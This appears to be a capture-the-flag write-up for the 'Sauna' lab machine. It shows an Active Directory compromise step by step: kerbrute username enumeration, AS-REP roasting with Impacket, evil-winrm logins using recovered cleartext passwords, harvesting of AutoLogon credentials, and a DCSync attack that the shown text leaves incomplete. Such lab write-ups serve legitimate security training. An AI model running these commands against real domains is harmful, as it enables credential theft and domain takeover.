Most important things to spot are:
1- There's an IIS server (port 80)
2- There's a Kerberos server (port 88)
3- There's the usual SMB ports (ports 135 and 445)
  
  
With these, we can start working. 

### Port 80
Browse the web server and we see a website by bank called Egotistical Bank. Observe that this is an information-only site, and that it's a custom-made application, so there's no special access to gain on the web application and no public exploits we can find for some quick wins. However, since we know there's Kerberos and some SMB ports open, we can start by finding possible usernames that we can use to crack some openings into either Kerberos or SMB.
  
  
And as luck would have it, we find the names of the employees on the "About Us" page. 
```
Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
Steven Kerb
```

We'll keep these for now, see that there's nothing much else we can do on the site, and proceed to the next port.

### Port 88
With Kerberos, we can enumerate usernames by using [`kerbrute`](https://github.com/ropnop/kerbrute) to throw usernames at the service until we get some valid returns. But first, we need to have a wordlist that contains valid usernames to succeed.
  
  
Now's the part where the employee names we found come in useful. To generate our wordlist for `kerbrute`, first we need to generate some corporate-looking usernames from the names we found. To do that, we can follow some common naming conventions used in corporate environments, like `firstname_lastname`, `first-character-of-firstname+lastname`, `first-two-characters-of-firstname+lastname`, etc ... . Now perhaps there's a smarter way of doing this, but I did this manually since we only have a few names:
```
fergus_smith
shaun_coins
hugo_bear
bowie_taylor
sophie_driver
steven_kerb
fsmith
scoins
hbear
btaylor
sdriver
skerb
fesmith
shcoins
botaylor
sodriver
stkerb
```
Throw this wordlist with `kerbrute` ...
```
sudo /opt/kerbrute/dist/kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL --dc sauna.htb wordlist.txt
```
```
kali@kali:~/htb/boxes/sauna/web$ sudo /opt/kerbrute/dist/kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL --dc sauna.htb wordlist.txt

```
Wham bam! We got ourselves a valid user, `fsmith`!

### AS-REP Roasting
Now in keeping with the name of the box (Sauna), we can suspect that the way forward is to Kerberoast valid users (_roast_ in a _sauna_, geddit?).
  
  
The usual way to perform a Kerberoast attack is first to request a valid Ticket Granting Service (TGS) from the Domain Controller (in our case the box), and from there crack the TGS for the service account password. However because in our case, since we only have a username without a password, we can't successfully impersonate our user to request for a valid TGS to perform the cracking. 
  
  
As it turns out, there exists a feature in Kerberos authentication that allows us to request tickets without passwords - accounts that are set to "do not require Kerberos pre-auth". Now this is a rarely disabled feature, but it might exist in an environment where system admins have to accommodate VPN logins or Linux machines in an Active Directory (AD) environment. If enabled, then theoretically we can grab the user account's AS-REP and crack it offline - such an attack is called AS-REP Roasting.  
  
  
Now since we have a valid user `fsmith` but no valid password, let's try our luck and see if `fsmith` is an account that has the "do not require Kerberos pre-auth" option enabled. To do this, we can use [`Impacket`'s `GetNPUsers` module](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#asreproast):
```
sudo GetNPUsers.py EGOTISTICAL-BANK.LOCAL/fsmith -format hashcat -outputfile ./hashes.asperoast -dc-ip sauna.htb
```
```
kali@kali:~/htb/boxes/sauna/kerb$ sudo GetNPUsers.py EGOTISTICAL-BANK.LOCAL/fsmith -format hashcat -outputfile ./hashes.asperoast -dc-ip sauna.htb

Save the TGT in a file like `hashes.asperoast`, and crack it with `john`:

### Shell as fsmith
Usually we have to do a full-port scan to see if there's a Windows Remote Management (WinRM) port open at 5985, but we can also try our luck just to login with the our newly-gotten credentials:
```
evil-winrm -i sauna.htb -u FSmith -p 'Thestrokes23'
```
```
kali@kali:~/htb/boxes/sauna/kerb$ evil-winrm -i sauna.htb -u FSmith -p 'Thestrokes23'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
egotisticalbank\fsmith
```
We see that it works, and now we're logged in as `fsmith`. At this point we can upload [WinPEAS.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe) and let it help us take a good look around. Once that's run, immediately we find another set of credentials:
```
[+] Looking for AutoLogon credentials(T1012)
    Some AutoLogon credentials were found!!
    DefaultDomainName             :  35mEGOTISTICALBANK
    DefaultUserName               :  35mEGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```
Great! Now before we try to login as `svc_loanmanager`, let's do a `net user` on the box to take a closer look at the credentials that exist in our environment.
```
*Evil-WinRM* PS C:\Users\FSmith\Documents> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
The command completed with one or more errors.
```
We see that we have another 'smith' in `HSmith`, and we learnt that the 'real' username for `svc_loanmanager` is `svc_loanmgr`! Discovering this would've saved you lots of future headaches had you tried to login with `svc_loanmanager`.

### Shell as svc_loanmgr
Perform a cursory `net user` check on `svc_loanmgr` and see that this account is a member of the `Remote Management Use` group.
```
*Evil-WinRM* PS C:\Users\FSmith\Documents> net user svc_loanmgr

```
Knowing this, we exit our shell as `fsmith` and login as `svc_loanmgr`:
```
evil-winrm -i sauna.htb -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```
```
kali@kali:~/htb/boxes/sauna/kerb$ evil-winrm -i sauna.htb -u svc_loanmgr -p 'Moneymakestheworldgoround!'

Evil-WinRM shell v2.3

```
Now here we did a `whoami /priv` immediately after logging on as `svc_loanmgr` - that's because I eventually found that `svc_loanmgr` has DC replication rights with which we can perform a DCSync attack to dump all credentials and get root! But this was through extensive trial and error, and working back I still could not see how I could have detected that `svc_loanmgr` had DC replication rights.

Somehow I couldn't get PowerView to be downloaded successfully on the box also, so I'm gonna just continue the post and leave the explaining to IppSec :) (Edit! I found out how to check privileges via Active Directory module in PowerShell, details below ^^)

### Priv via DCSync with svc_loanmgr

As mentioned, I had discovered through extensive trial and error that the `svc_loanmgr` account possesses DC Replication rights, with which we can perform a DCSync attack. To do that, we can use [`Impacket`'s `secretsdump` module](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py):
```
kali@kali:~/htb/boxes/sauna/kerb$ pass="Moneymakestheworldgoround!"

### Beyond Root: Enumerating privileges

Before proceeding, all credit to [this post](https://community.spiceworks.com/topic/362507-powershell-command-to-list-permissions-on-an-ad-user-object).
  
  
So the ways to identify whether a user has DC Replication rights is to see whether 
```
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> (Get-ACL "AD:$((Get-ADUser svc_loanmgr).distinguishedname)").access
[...]
```
You know what, I still couldn't see the required privileges for DCSync after running that command on `svc_loanmgr`. Hm.
